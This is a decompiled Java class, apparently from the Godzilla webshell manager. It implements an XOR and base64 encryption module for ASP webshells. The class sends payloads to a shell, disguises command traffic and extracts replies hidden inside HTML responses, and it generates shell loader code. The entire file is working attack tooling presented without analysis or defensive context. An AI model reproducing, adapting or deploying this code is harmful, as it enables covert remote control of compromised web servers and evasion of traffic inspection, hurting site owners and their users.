/*     */ package shells.cryptions.aspXor;
/*     */ 
/*     */ import core.annotation.CryptionAnnotation;
/*     */ import core.imp.Cryption;
/*     */ import core.shell.ShellEntity;
/*     */ import java.net.URLEncoder;
/*     */ import util.Log;
/*     */ import util.functions;
/*     */ import util.http.Http;
/*     */ 
/*     */ @CryptionAnnotation(Name = "ASP_XOR_BASE64", payloadName = "AspDynamicPayload")
/*     */ public class AspXorBae64
/*     */   implements Cryption
/*     */ {
/*     */   private ShellEntity shell;
/*     */   private Http http;
/*     */   private byte[] key;
/*     */   private boolean state;
/*     */   private String pass;
/*     */   private byte[] payload;
/*     */   private String findStrLeft;
/*     */   private String findStrRight;
/*     */   
/*     */   public void init(ShellEntity context) {
/*  25 */     this.shell = context;
/*  26 */     this.http = this.shell.getHttp();
/*  27 */     this.key = this.shell.getSecretKeyX().getBytes();
/*  28 */     this.pass = this.shell.getPassword();
/*  29 */     String findStrMd5 = functions.md5(this.pass + new String(this.key));
/*  30 */     this.findStrLeft = findStrMd5.substring(0, 6);
/*  31 */     this.findStrRight = findStrMd5.substring(20, 26);
/*     */     try {
/*  33 */       this.payload = this.shell.getPayloadModule().getPayload();
/*  34 */       if (this.payload != null) {
/*  35 */         this.http.sendHttpResponse(this.payload);
/*  36 */         this.state = true;
/*     */       } else {
/*  38 */         Log.error("payload Is Null");
/*     */       }
/*     */     
/*  41 */     } catch (Exception e) {
/*  42 */       Log.error(e);
/*     */       return;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] encode(byte[] data) {
/*     */     try {
/*  51 */       return E(data);
/*  52 */     } catch (Exception e) {
/*  53 */       Log.error(e);
/*  54 */       return null;
/*     */     } 
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] decode(byte[] data) {
/*  61 */     if (data != null && data.length > 0) {
/*     */       try {
/*  63 */         return D(findStr(data));
/*  64 */       } catch (Exception e) {
/*  65 */         Log.error(e);
/*  66 */         return null;
/*     */       } 
/*     */     }
/*  69 */     return data;
/*     */   }
/*     */ 
/*     */ 
/*     */ 
/*     */ 
/*     */   
/*     */   public boolean isSendRLData() {
/*  77 */     return true;
/*     */   }
/*     */   
/*     */   protected void decryption(byte[] data, byte[] key) {
/*  81 */     int len = data.length;
/*  82 */     int keyLen = key.length;
/*  83 */     int index = 0;
/*  84 */     for (int i = 1; i <= len; i++) {
/*  85 */       index = i - 1;
/*  86 */       data[index] = (byte)(data[index] ^ key[i % keyLen]);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public byte[] E(byte[] cs) {
/*  92 */     decryption(cs, this.key);
/*  93 */     return (this.pass + "=" + URLEncoder.encode(functions.base64EncodeToString(cs))).getBytes();
/*     */   }
/*     */   public byte[] D(String data) {
/*  96 */     byte[] cs = functions.base64Decode(data);
/*     */     
/*  98 */     decryption(cs, this.key);
/*  99 */     return cs;
/*     */   }
/*     */   public String findStr(byte[] respResult) {
/* 102 */     String htmlString = new String(respResult);
/* 103 */     return functions.subMiddleStr(htmlString, this.findStrLeft, this.findStrRight);
/*     */   }
/*     */ 
/*     */   
/*     */   public boolean check() {
/* 108 */     return this.state;
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public byte[] generate(String password, String secretKey) {
/* 114 */     return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), getClass().getSimpleName());
/*     */   }
/*     */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\cryptions\aspXor\AspXorBae64.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */